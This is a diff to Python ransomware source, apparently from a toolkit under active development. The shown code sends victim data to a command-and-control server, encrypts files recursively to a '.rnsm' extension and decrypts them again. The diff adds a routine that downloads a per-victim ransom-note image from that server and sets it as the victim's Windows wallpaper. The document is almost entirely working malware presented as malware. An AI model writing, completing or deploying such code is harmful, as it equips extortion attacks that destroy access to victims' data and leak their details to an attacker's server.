@@ -76,7 +76,6 @@ class Ransomware:
             "ip": (None, self.public_ip),
         }
         # Send victim data via HTTP Form post to the C2 server
-        # TODO: Try/Fail in case of bad/no internet connection?
         try:
             response = httpx.post(f"{c2_url}/create", files=payload)
         except httpx.TimeoutException as err:
@@ -122,7 +121,7 @@ class Ransomware:
                         for name in files:
                             filepath = os.path.join(path, name)
                             self.encrypt_file(filepath)
-                            print(f"Encrypted: {filepath}  -->  {filepath}.rnsm")
+                            print(f"🔒 Encrypted: {filepath}  -->  {filepath}.rnsm")
             except Exception as err:
                 print("start_encryption(): Error --> ", err)
             self.encryption_key = None
@@ -156,15 +155,33 @@ class Ransomware:
                         for name in files:
                             filepath = os.path.join(path, name)
                             self.decrypt_file(filepath)
-                            print(f"Decrypted: {filepath}.rnsm  -->  {filepath}")
+                            print(f"🔓 Decrypted: {filepath}.rnsm  -->  {filepath}")
             except Exception as err:
                 print("start_decryption(): Error --> ", err)
 
     def change_wallpaper(self):
         "Change the victim's wallpaper to display our ransom note"
-        # TODO: Create Server API to create customized ransom note wallpapers
-        image_path = "C:\\ransom.jpg"
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
+        sleep(3)
+        try:
+            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
+        except httpx.TimeoutException as err:
+            print("change_wallpaper(): Timeout Error --> ", err)
+            sleep(60)
+            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
+        except httpx.RequestError as err:
+            print("change_wallpaper(): Request Exception --> ", err)
+            response = httpx.get(f"{c2_url}/static/wp/{self.victim_id}.png")
+        image_path = f"C:\\Users\\{self.username}\\Desktop\\ransompaper.png"
+        try:
+            file = open(image_path, "wb")
+            file.write(response.content)
+            file.close()
+            print("🖼🖼🖼 Changing wallpaper...")
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
+        except FileNotFoundError as err:
+            print("change_wallpaper(): FileNotFound Error --> ", err)
+        except Exception as err:
+            print("change_wallpaper(): Error --> ", err)
 
     def fear_and_loathing(self):
         self.change_wallpaper()
